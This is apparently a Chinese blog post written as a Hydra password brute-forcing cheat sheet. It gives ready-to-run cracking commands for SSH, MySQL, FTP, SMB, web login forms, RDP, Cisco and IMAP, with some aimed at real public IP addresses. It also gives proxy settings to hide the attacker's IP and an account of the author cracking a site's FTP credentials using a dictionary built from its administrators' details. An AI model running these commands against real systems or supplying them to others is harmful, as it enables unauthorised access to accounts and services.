---
title: Hydra 破解登录密码
date: 2016-03-29T21:25:45+08:00
update: 2016-01-01
categories: [网络安全]
tags: [Hydra]
---
hydra -L user.txt -P pass.txt -o savessh.log -f -vV -e ns 10.0.5.24 ssh
hydra -L user.txt -P sup.txt -o savessh.log -f -vV -e ns 113.105.144.130 mysql
hydra -M list.txt -l root -P dict1000.txt -t 64 -o ssh.txt ssh

###Hydra 破解登录密码###

格式：

hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]
server service [OPT] # 可选的

-R 继续从上一次进度接着破解
-S 采用SSL链接（大写的S）
-s PORT 如果非默认端口，可通过这个参数指定
-l LOGIN 小写，用于指定破解的用户，对特定用户破解
-L FILE 大写，用于指定用户的用户名字典
-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典
-P FILE 大写，用于指定密码字典
-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
-C FILE 使用冒号分割格式 例如 “登录名:密码”来代替-L/-P参数
-M FILE 指定目标列表文件一行一条
-o FILE 指定结果输出文件
-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解
-t TASKS 同时运行的线程数，默认为16
-w TIME 设置最大超时的时间，单位秒，默认是30s
-v / -V 显示详细过程
server 目标ip
service 指定服务名，支持如下:
telnet ftp pop3[-ntlm]
imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco
cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5
rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere
teamspeak sip vmauthd firebird ncp afp

OPT 可选项

###如何使用代理服务器进行破解（这一点主要处于攻击者的ip，处于自身安全考虑）### HYDRA_PROXY_HTTP 变量参数可以用来定义代理服务器(只能使用http代理) 语法:

HYDRA_PROXY_HTTP=”http://ip:port/”
HYDRA_PROXY_CONNECT=ip:8000

如果你使用的代理需要用户名和密码，请使用HYDRA_PROXY_AUTH 变量参数:

HYDRA_PROXY_AUTH=”the_login:the_password”

###实例破解###

####1.ftp密码破解#### 结合自己实例，最近试探一个网站，得到了ftp用户，是serv-u6.02但是无法破解密码，我通过收集这些ftp用户将结果保存在 ftpuser.lst文件中，同时通过收集各个网站的信息，包括管理员的信息组合形成一个密码字典ftppwd.lst。于是，就开始尝试破解，命令如 下：

sudo hydra -L /home/dict/ftpuser.lst -P /home/dict/ftppwd.lst 218.86.103.* ftp

这个是基于多用户密码破解，另外还有一个本地ftp密码破解方案。为了效率我直接将密码写入到pwd.lst字典中

sudo hydra -l administrator -P /home/dict/pwd.lst -v 192.168.8.6 ftp

返回结果如下，成功破解了密码：

# 该行说明任务总数，会根据你提供用户名和密码进行计算，l:1/p:2表示一个用户名，密码字典中又2个密码
[DATA] 2 tasks, 1 servers, 2 login tries (l:1/p:2), ~1 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses … done
[STATUS] attack finished for 192.168.8.6 (waiting for childs to finish)
# 破解成功，直接显示出来，当然你可以让他输出到文件，通过参数-o设定
[21][ftp] host: 192.168.8.6 login: administrator password: 123

通过这种方法有极大可能破解这个ftp，当然关键在于你的字典，我们可以通过字典生成器就可以很好的破解了.

####2.samba密码破解#### 利用nmap扫描到服务器开启了samba服务，于是尝试收集该服务器信息组合成密码字典。由于该应用类似ftp破解，这里不对具体演示，只是将ftp服务改成smb服务即可。

####3.网站后台密码破解#### 该软件的强大之处就在于支持多种协议的破解，同样他也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具又一个不好的地方就是，如果目标网站登录时候需要验证码无法破解了。带参数破解如下：

<form action=”index.php” method=”POST”>
<input type=”text” name=”name” /><BR><br>
<input type=”password” name=”pwd” /><br><br>
<input type=”submit” name=”sub” value=”提交”>

假设有以上一个密码登录表单，我们执行命令：

sudo hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”

# 破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t是同时线程数为1，-f是当破解了一个密码就停止，ip是本 地，就是目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解后面参数是网页中对应的表单字段的name属 性,后面title中的内容是表示错误猜解的返回信息提示，可以自定义。

###总结### 该工具的强大只有你自行体验了，当然密码能否破解关键在于你的字典。以上一些实例操作仅仅是提供的支持的众多服务中的3种，其他的服务也同样非常强大，留给大家自行体会。其实密码字典的生成有相关的工 具，你可以自己生成符合一定规则的密码字典。当然如果你是一个成功的社工专家，往往能够得到事半功倍的效果。

####1、破解ssh：####

hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

####2、破解ftp：#### hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

####3、get方式提交，破解web登录：#### hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

####4、post方式提交，破解web登录：####

hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"

（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）

####5、破解https：####

hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

####6、破解teamspeak：####

hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

####7、破解cisco：####

hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

####8、破解smb：####

hydra -l administrator -P pass.txt 10.36.16.18 smb

####9、破解pop3：####

hydra -l muts -P pass.txt my.pop3.mail pop3

####10、破解rdp：####

hydra ip rdp -l administrator -P pass.txt -V

####11、破解http-proxy：####

hydra -l admin -P pass.txt http-proxy://10.36.16.18

####12、破解imap：####

hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAINshot
